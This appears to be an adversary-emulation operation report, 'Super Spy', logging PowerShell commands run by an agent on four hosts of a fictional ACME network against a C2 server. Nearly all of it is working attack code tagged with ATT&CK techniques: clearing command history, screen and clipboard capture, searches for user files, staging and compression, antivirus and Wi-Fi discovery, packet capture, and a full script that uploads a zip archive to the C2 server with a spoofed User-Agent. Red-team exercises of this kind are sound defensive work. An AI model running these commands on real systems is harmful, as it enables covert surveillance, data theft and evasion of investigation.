
Super Spy
=========

Contents
========

* [Hosts Attacked](#hosts-attacked)
* [Links](#links)
	* [Host: ACME-HH-ZYQ](#host-acme-hh-zyq)
	* [Host: ACME-HH-EUO](#host-acme-hh-euo)
	* [Host: ACME-WS-PLU](#host-acme-ws-plu)
	* [Host: ACME-HH-ESO](#host-acme-hh-eso)
* [Steps](#steps)
	* [Host: ACME-HH-ZYQ (paw: kwmxux)](#host-acme-hh-zyq-paw-kwmxux)
		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Identify AV](#--description-identify-av)
		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)
	* [Host: ACME-HH-EUO (paw: acpuoe)](#host-acme-hh-euo-paw-acpuoe)
		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Compress a directory on the file system](#--description-compress-a-directory-on-the-file-system)
		* [  Description: Identify AV](#--description-identify-av)
		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)
		* [  Description: Perform a packet capture](#--description-perform-a-packet-capture)
	* [Host: ACME-WS-PLU (paw: hkrmxr)](#host-acme-ws-plu-paw-hkrmxr)
		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: copy files to staging directory](#--description-copy-files-to-staging-directory)
		* [  Description: copy files to staging directory](#--description-copy-files-to-staging-directory)
		* [  Description: copy files to staging directory](#--description-copy-files-to-staging-directory)
		* [  Description: Compress a directory on the file system](#--description-compress-a-directory-on-the-file-system)
		* [  Description: Exfil the staged directory](#--description-exfil-the-staged-directory)
		* [  Description: Identify AV](#--description-identify-av)
		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)
		* [  Description: Perform a packet capture](#--description-perform-a-packet-capture)
	* [Host: ACME-HH-ESO (paw: nowkww)](#host-acme-hh-eso-paw-nowkww)
		* [  Description: capture the contents of the screen](#--description-capture-the-contents-of-the-screen)
		* [  Description: copy the contents for the clipboard and print them](#--description-copy-the-contents-for-the-clipboard-and-print-them)
		* [  Description: create a directory for exfil staging](#--description-create-a-directory-for-exfil-staging)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Locate files deemed sensitive](#--description-locate-files-deemed-sensitive)
		* [  Description: Compress a directory on the file system](#--description-compress-a-directory-on-the-file-system)
		* [  Description: Identify AV](#--description-identify-av)
		* [  Description: View all potential WIFI networks on host](#--description-view-all-potential-wifi-networks-on-host)
		* [  Description: See the most used WIFI networks of a machine](#--description-see-the-most-used-wifi-networks-of-a-machine)

# Hosts Attacked

|Host|User|Beachhead Command|PID|Parent PID|IP|C2 Server|
| :---: | :---: | :---: | :---: | :---: | :---: | :---: |
|ACME-HH-ZYQ|ACME\grantj|splunkd.exe|3872|4840|172.31.45.222|http://172.31.10.226:8888|
|ACME-HH-EUO|ACME\grantj|splunkd.exe|1052|2004|172.31.41.178|http://172.31.10.226:8888|
|ACME-WS-PLU|ACME\grantj|splunkd.exe|1116|8312|172.31.11.139, 172.25.240.1|http://172.31.10.226:8888|
|ACME-HH-ESO|ACME\grantj|splunkd.exe|8376|8992|172.31.39.111|http://172.31.10.226:8888|

# Links

(what exactly is a link? seems to be a command executed when initializing the beachhead?)
## Host: ACME-HH-ZYQ


  Technique: Indicator Removal on Host: Clear Command History

  PID: 2304

  Status: Success

  Start: 2024-09-04T03:18:40Z

  Finish: 2024-09-04T03:18:40Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-HH-EUO


  Technique: Indicator Removal on Host: Clear Command History

  PID: 4324

  Status: Success

  Start: 2024-09-13T17:10:22Z

  Finish: 2024-09-13T17:10:22Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-WS-PLU


  Technique: Indicator Removal on Host: Clear Command History

  PID: 8504

  Status: Success

  Start: 2024-09-13T17:12:11Z

  Finish: 2024-09-13T17:12:12Z

  Command: 
```powershell
Clear-History;Clear
```


## Host: ACME-HH-ESO


  Technique: Indicator Removal on Host: Clear Command History

  PID: 10164

  Status: Success

  Start: 2024-09-13T17:15:40Z

  Finish: 2024-09-13T17:15:40Z

  Command: 
```powershell
Clear-History;Clear
```


# Steps

## Host: ACME-HH-ZYQ (paw: kwmxux)

###   Description: capture the contents of the screen


  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}

  Status: Success

  PID: 792

  Start: 2024-09-13T18:22:34Z

  Command: 
```powershell
$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
```


###   Description: copy the contents for the clipboard and print them


  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}

  Status: Success

  PID: 1260

  Start: 2024-09-13T18:23:13Z

  Command: 
```powershell
Get-Clipboard -raw
```


###   Description: create a directory for exfil staging


  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}

  Status: Failed

  PID: 3112

  Start: 2024-09-13T18:24:09Z

  Command: 
```powershell
New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 5520

  Start: 2024-09-13T18:25:05Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 8376

  Start: 2024-09-13T18:25:51Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 8636

  Start: 2024-09-13T18:26:37Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Identify AV


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Failed

  PID: 8324

  Start: 2024-09-13T18:27:20Z

  Command: 
```powershell
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
```


###   Description: View all potential WIFI networks on host


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Failed

  PID: 9028

  Start: 2024-09-13T18:27:54Z

  Command: 
```powershell
.\obfuscated_payload.ps1 -Scan
```


###   Description: See the most used WIFI networks of a machine


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Failed

  PID: 4704

  Start: 2024-09-13T18:28:57Z

  Command: 
```powershell
.\wifi.ps1 -Pref
```


## Host: ACME-HH-EUO (paw: acpuoe)

###   Description: capture the contents of the screen


  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}

  Status: Success

  PID: 5432

  Start: 2024-09-13T18:22:31Z

  Command: 
```powershell
$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
```


###   Description: copy the contents for the clipboard and print them


  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}

  Status: Success

  PID: 6472

  Start: 2024-09-13T18:23:08Z

  Command: 
```powershell
Get-Clipboard -raw
```


###   Description: create a directory for exfil staging


  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}

  Status: Success

  PID: 4396

  Start: 2024-09-13T18:23:44Z

  Command: 
```powershell
New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 3032

  Start: 2024-09-13T18:24:48Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 5860

  Start: 2024-09-13T18:25:49Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 4468

  Start: 2024-09-13T18:26:36Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Compress a directory on the file system


  Attack: {'tactic': 'exfiltration', 'technique_name': 'Archive Collected Data: Archive via Utility', 'technique_id': 'T1560.001'}

  Status: Failed

  PID: 6956

  Start: 2024-09-13T18:27:41Z

  Command: 
```powershell
Compress-Archive -Path C:\Windows\system32\staged -DestinationPath C:\Windows\system32\staged.zip -Force;sleep 1; ls C:\Windows\system32\staged.zip | foreach {$_.FullName} | select
```


###   Description: Identify AV


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Failed

  PID: 6208

  Start: 2024-09-13T18:28:17Z

  Command: 
```powershell
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
```


###   Description: View all potential WIFI networks on host


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Failed

  PID: 2188

  Start: 2024-09-13T18:29:18Z

  Command: 
```powershell
.\obfuscated_payload.ps1 -Scan
```


###   Description: See the most used WIFI networks of a machine


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Success

  PID: 5216

  Start: 2024-09-13T18:30:00Z

  Command: 
```powershell
.\wifi.ps1 -Pref
```


###   Description: Perform a packet capture


  Attack: {'tactic': 'credential-access', 'technique_name': 'Network Sniffing', 'technique_id': 'T1040'}

  Status: Success

  PID: 3840

  Start: 2024-09-13T18:32:12Z

  Command: 
```powershell
$path = "$ENV:UserProfile\Desktop\pcap.etl";New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";Start-NetEventSession -Name "PCAP";Start-Sleep -s 60;Stop-NetEventSession -Name "PCAP";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo "Failed to generate PCAP file.";  exit 1;};
```


## Host: ACME-WS-PLU (paw: hkrmxr)

###   Description: capture the contents of the screen


  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}

  Status: Success

  PID: 9912

  Start: 2024-09-13T18:22:15Z

  Command: 
```powershell
$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
```


###   Description: copy the contents for the clipboard and print them


  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}

  Status: Success

  PID: 3504

  Start: 2024-09-13T18:23:18Z

  Command: 
```powershell
Get-Clipboard -raw
```


###   Description: create a directory for exfil staging


  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}

  Status: Success

  PID: 8676

  Start: 2024-09-13T18:24:02Z

  Command: 
```powershell
New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 6552

  Start: 2024-09-13T18:25:06Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 6360

  Start: 2024-09-13T18:25:41Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 9144

  Start: 2024-09-13T18:26:49Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: copy files to staging directory


  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}

  Status: Success

  PID: 5320

  Start: 2024-09-13T18:27:46Z

  Command: 
```powershell
Copy-Item C:\Users\grantj\.conda\pkgs\ipykernel-6.26.0-pyha63f2e9_0\share\jupyter\kernels\python3\logo-64x64.png C:\Windows\system32\staged
```


###   Description: copy files to staging directory


  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}

  Status: Success

  PID: 5888

  Start: 2024-09-13T18:28:47Z

  Command: 
```powershell
Copy-Item C:\Users\grantj\.conda\pkgs\ipykernel-6.26.0-pyha63f2e9_0\share\jupyter\kernels\python3\logo-32x32.png C:\Windows\system32\staged
```


###   Description: copy files to staging directory


  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}

  Status: Success

  PID: 8424

  Start: 2024-09-13T18:29:46Z

  Command: 
```powershell
Copy-Item C:\Users\grantj\.conda\pkgs\ipython-8.17.2-pyh5737063_0\site-packages\IPython\lib\tests\test.wav C:\Windows\system32\staged
```


###   Description: Compress a directory on the file system


  Attack: {'tactic': 'exfiltration', 'technique_name': 'Archive Collected Data: Archive via Utility', 'technique_id': 'T1560.001'}

  Status: Success

  PID: 8848

  Start: 2024-09-13T18:30:34Z

  Command: 
```powershell
Compress-Archive -Path C:\Windows\system32\staged -DestinationPath C:\Windows\system32\staged.zip -Force;sleep 1; ls C:\Windows\system32\staged.zip | foreach {$_.FullName} | select
```


###   Description: Exfil the staged directory


  Attack: {'tactic': 'exfiltration', 'technique_name': 'Exfiltration Over C2 Channel', 'technique_id': 'T1041'}

  Status: Success

  PID: 8132

  Start: 2024-09-13T18:31:31Z

  Command: 
```powershell
$ErrorActionPreference = 'Stop';$fieldName = "C:\Windows\system32\staged.zip";$filePath = "C:\Windows\system32\staged.zip";$url = "http://172.31.10.226:8888/file/upload";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-hkrmxr');$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();
```


###   Description: Identify AV


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Failed

  PID: 268

  Start: 2024-09-13T18:33:02Z

  Command: 
```powershell
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
```


###   Description: View all potential WIFI networks on host


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Failed

  PID: 5248

  Start: 2024-09-13T18:33:36Z

  Command: 
```powershell
.\obfuscated_payload.ps1 -Scan
```


###   Description: See the most used WIFI networks of a machine


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Success

  PID: 740

  Start: 2024-09-13T18:34:14Z

  Command: 
```powershell
.\wifi.ps1 -Pref
```


###   Description: Perform a packet capture


  Attack: {'tactic': 'credential-access', 'technique_name': 'Network Sniffing', 'technique_id': 'T1040'}

  Status: Success

  PID: 6924

  Start: 2024-09-13T18:36:23Z

  Command: 
```powershell
$path = "$ENV:UserProfile\Desktop\pcap.etl";New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";Start-NetEventSession -Name "PCAP";Start-Sleep -s 60;Stop-NetEventSession -Name "PCAP";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo "Failed to generate PCAP file.";  exit 1;};
```


## Host: ACME-HH-ESO (paw: nowkww)

###   Description: capture the contents of the screen


  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}

  Status: Success

  PID: 4844

  Start: 2024-09-13T18:22:20Z

  Command: 
```powershell
$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
```


###   Description: copy the contents for the clipboard and print them


  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}

  Status: Success

  PID: 2356

  Start: 2024-09-13T18:23:22Z

  Command: 
```powershell
Get-Clipboard -raw
```


###   Description: create a directory for exfil staging


  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}

  Status: Success

  PID: 10080

  Start: 2024-09-13T18:24:18Z

  Command: 
```powershell
New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 4820

  Start: 2024-09-13T18:25:12Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 7636

  Start: 2024-09-13T18:25:56Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Locate files deemed sensitive


  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}

  Status: Success

  PID: 1716

  Start: 2024-09-13T18:26:47Z

  Command: 
```powershell
Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
```


###   Description: Compress a directory on the file system


  Attack: {'tactic': 'exfiltration', 'technique_name': 'Archive Collected Data: Archive via Utility', 'technique_id': 'T1560.001'}

  Status: Failed

  PID: 3200

  Start: 2024-09-13T18:27:32Z

  Command: 
```powershell
Compress-Archive -Path C:\Users\grantj\staged -DestinationPath C:\Users\grantj\staged.zip -Force;sleep 1; ls C:\Users\grantj\staged.zip | foreach {$_.FullName} | select
```


###   Description: Identify AV


  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}

  Status: Failed

  PID: 1096

  Start: 2024-09-13T18:28:13Z

  Command: 
```powershell
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
```


###   Description: View all potential WIFI networks on host


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Failed

  PID: 5000

  Start: 2024-09-13T18:29:20Z

  Command: 
```powershell
.\obfuscated_payload.ps1 -Scan
```


###   Description: See the most used WIFI networks of a machine


  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}

  Status: Success

  PID: 7516

  Start: 2024-09-13T18:30:13Z

  Command: 
```powershell
.\wifi.ps1 -Pref
```

